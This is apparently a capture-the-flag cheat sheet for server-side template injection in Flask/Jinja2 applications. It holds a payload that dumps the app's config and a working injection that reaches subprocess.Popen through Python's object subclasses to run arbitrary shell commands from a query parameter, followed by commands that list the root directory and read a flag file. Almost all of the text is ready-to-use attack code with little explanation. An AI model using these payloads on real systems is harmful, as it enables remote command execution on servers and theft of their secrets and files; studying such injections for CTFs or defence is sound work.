### Show flask config
```
{{ config }}
```

### Injection script
```
{{request.__class__.__mro__[-1].__subclasses__()[407]([request.args.cmd], shell=True, stdout=-1).communicate()}}
```
Make sure:
```
request.__class__.__mro__[-1] = <class 'object'>
request.__class__.__mro__[-1].__subclasses__()[407] = <class 'subprocess.Popen'>
```

To find flag filename: `&cmd=ls /`
Get the flag using: `&cmd=cat /%FLAG_FILENAME%`